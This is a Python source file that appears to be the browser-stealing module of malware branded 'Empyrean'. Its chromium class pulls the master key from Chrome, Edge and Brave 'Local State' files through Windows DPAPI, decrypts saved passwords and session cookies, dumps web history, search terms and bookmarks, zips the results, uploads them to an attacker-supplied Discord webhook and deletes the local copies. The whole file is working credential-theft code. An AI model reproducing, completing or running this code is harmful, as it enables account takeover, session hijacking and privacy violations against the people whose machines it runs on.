import base64
import json
import os
import shutil
import sqlite3
from zipfile import ZipFile

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

from discord import File, SyncWebhook


class chromium():
    def __init__(self, webhook: str) -> None:
        webhook = SyncWebhook.from_url(webhook)

        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'brave-browser': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue
                
            self.masterkey = self.get_master_key(path + '\\Local State')
            self.files = [
                '.\\' + name + '-passwords.txt',
                '.\\' + name + '-cookies.txt',
                '.\\' + name + '-web-history.txt',
                '.\\' + name + '-search-history.txt',
                '.\\' + name + '-bookmarks.txt',
            ]

            for file in self.files:
                with open(file, 'w') as f:
                    pass

            self.funcs = [
                self.passwords,
                self.cookies,
                self.web_history,
                self.search_history,
                self.bookmarks,
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass

            with ZipFile('.\\' + name + '-vault.zip', 'w') as zip:
                for file in self.files:
                    zip.write(file)

            for file in self.files:
                if os.path.isfile(file):
                    os.remove(file)

            if os.path.isfile('.\\' + name + '-vault.zip'):
                if not os.path.getsize('.\\' + name + '-vault.zip') > 8000000:
                    webhook.send(file=File('.\\' + name + '-vault.zip'),
                                 username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
                    os.remove('.\\' + name + '-vault.zip')

    def get_master_key(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        vault = name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open('.\\' + name + '-passwords.txt', 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                url, username, password = res
                password = self.decrypt_password(password, self.masterkey)
                if url != "" and username != "" and password != "":
                    f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(
                        username, password, url))

        cursor.close()
        conn.close()
        os.remove(vault)

    def cookies(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        vault = name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open('.\\' + name + '-cookies.txt', 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall():
                host_key, name, encrypted_value = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key != "" and name != "" and value != "":
                    f.write("Host: {:<40} Name: {:<40} Value: {}\n".format(
                        host_key, name, value))

        cursor.close()
        conn.close()
        os.remove(vault)

    def web_history(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        vault = name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open('.\\' + name + '-web-history.txt', 'a', encoding="utf-8") as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url != "" and title != "" and visit_count != "" and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))

            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(
                    site[2], site[1]))

        cursor.close()
        conn.close()
        os.remove(vault)

    def search_history(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        vault = name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open('.\\' + name + '-search-history.txt', 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT term FROM keyword_search_terms").fetchall():
                term = res[0]
                if term != "":
                    f.write("Search: {}\n".format(term))

        cursor.close()
        conn.close()
        os.remove(vault)

    def bookmarks(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\Bookmarks'
        if not os.path.isfile(path):
            return
        shutil.copy2(path, 'bookmarks.json')
        with open('bookmarks.json', 'r', encoding="utf-8") as f:
            for item in json.loads(f.read())['roots']['bookmark_bar']['children']:
                if 'children' in item:
                    for child in item['children']:
                        if 'url' in child:
                            with open('.\\' + name + '-bookmarks.txt', 'a', encoding="utf-8") as f:
                                f.write("URL: {}\n".format(child['url']))
                elif 'url' in item:
                    with open('.\\' + name + '-bookmarks.txt', 'a', encoding="utf-8") as f:
                        f.write("URL: {}\n".format(item['url']))

        os.remove('bookmarks.json')
